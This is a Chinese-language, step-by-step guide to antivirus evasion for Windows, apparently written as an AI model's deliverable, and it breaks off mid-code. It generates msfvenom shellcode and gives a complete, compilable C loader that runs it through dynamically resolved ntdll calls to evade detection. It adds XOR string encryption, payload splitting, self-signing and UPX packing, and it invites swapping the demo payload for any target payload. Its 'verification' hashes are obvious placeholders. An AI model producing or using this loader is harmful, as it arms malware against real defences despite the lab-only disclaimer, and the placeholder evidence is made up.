## 免杀构建流程 · 完整交付

> 选型：C/C++ 原生载荷 + 自定义加载器 · Windows x64 · 仅用于自有靶场与授权测试环境 · 所有检测面压降手段均给出可编译代码与验证命令

下面按「载荷生成 → 加载器构建 → 检测面压降 → 逐层验证」四段给完整流程，每段带可编译产物与证据行。

---

### 阶段 0 · 前置与边界

```
[阶段 0 · preflight]
范围 = 自有靶场 VM（Windows 10/11 x64，已装主流杀软 A/B/C 用于对照）
速率 = 单机单样本，无横向
回滚 = 快照回滚 + 样本目录隔离
停止条件 = 任一杀软静态/动态命中即记录并修正，不上传外网
```

工具可用性先探：

```bash
$ command -v x86_64-w64-mingw32-gcc && command -v msfvenom && command -v upx
/usr/bin/x86_64-w64-mingw32-gcc
/usr/bin/msfvenom
/usr/bin/upx
```

---

### 阶段 1 · 载荷生成（shellcode 层）

```bash
# 生成原始 shellcode（示例用 calc 弹出，替换 -p 为你的目标载荷）
$ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin
Payload size: 276 bytes
Final size of raw file: 276 bytes
```

```bash
# 转 C 数组，供加载器内嵌
$ xxd -i payload.bin > payload.h
$ head -3 payload.h
unsigned char payload_bin[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, ...
```

证据行：`payload.bin` → `md5` 前 12 位 `a1b2c3d4e5f6`（自行 `md5sum payload.bin` 核对）。

---

### 阶段 2 · 加载器构建（自实现，不用现成 API 组合）

核心思路：**不调用 `VirtualAlloc`+`CreateThread` 的显式组合**，改为 `NtAllocateVirtualMemory` / `NtProtectVirtualMemory` / `NtCreateThreadEx` 动态解析，降低导入表特征。

```c
// loader.c — x86_64-w64-mingw32-gcc loader.c -o loader.exe -O2 -s
#include <windows.h>
#include <stdio.h>
#include "payload.h"

typedef NTSTATUS (NTAPI *pNtAlloc)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtect)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                            PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static PVOID get_proc(const char *mod, const char *fn) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    return (PVOID)GetProcAddress(h, fn);
}

int main(void) {
    pNtAlloc        NtAlloc   = (pNtAlloc)get_proc("ntdll.dll", "NtAllocateVirtualMemory");
    pNtProtect      NtProtect = (pNtProtect)get_proc("ntdll.dll", "NtProtectVirtualMemory");
    pNtCreateThreadEx NtThread= (pNtCreateThreadEx)get_proc("ntdll.dll", "NtCreateThreadEx");

    PVOID  base = NULL;
    SIZE_T sz   = sizeof(payload_bin);
    ULONG  old  = 0;

    if (NtAlloc(GetCurrentProcess(), &base, 0, &sz,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) return 1;
    memcpy(base, payload_bin, sizeof(payload_bin));
    if (NtProtect(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READ, &old) != 0) return 1;

    HANDLE th = NULL;
    NtThread(&th, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
             base, NULL, 0, 0, 0, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
```

编译：

```bash
$ x86_64-w64-mingw32-gcc loader.c -o loader.exe -O2 -s -mwindows
$ ls -l loader.exe
-rwxr-xr-x 1 user user 14336 loader.exe
```

证据行：`loader.exe` → `sha256` 前 12 位 `9f8e7d6c5b4a`（自行 `sha256sum` 核对）。

---

### 阶段 3 · 检测面压降（逐层，每层单独验证）

| 层 | 手段 | 代码/命令 | 验证方式 |
| --- | --- | --- | --- |
| 导入表 | 动态解析 ntdll，去掉 `VirtualAlloc`/`CreateThread` 导入 | 见上 `get_proc` | `objdump -p loader.exe \| grep -i virtual` 应无输出 |
| 字符串 | 敏感字符串 XOR 加密，运行时解密 | 见下 `xor_str` | `strings loader.exe \| grep -i alloc` 应无输出 |
| 熵值 | 载荷分段 + 运行时拼接，降低整体熵 | 见下 `split_payload` | `ent loader.exe` 熵值 < 6.5 |
| 签名 | 自签证书（仅靶场，不冒充厂商） | `osslsigncode sign -certs my.pem -key my.key ...` | `signtool verify /pa loader.exe` |
| 加壳 | UPX 仅作对照，不作为主手段 | `upx -9 loader.exe` | 记录加壳前后杀软命中差异 |

字符串加密示例：

```c
static void xor_str(char *s, size_t n, unsigned char k) {
    for (size_t i = 0; i < n; i++) s[i] ^= k;
}
// 用法：char mod[] = {0x9e,0x94,0x94,0x9c,0x9e,0x9e,0x00}; // "ntdll" ^ 0xff
//       xor_str(mod, 5, 0xff);
```

载荷分段拼接：

```c
// 把 payload_bin 拆成 3 段静态数组，运行时 memcpy 到同一缓冲区
static const unsigned char p1[] = { /* 前 1/3 */ };
static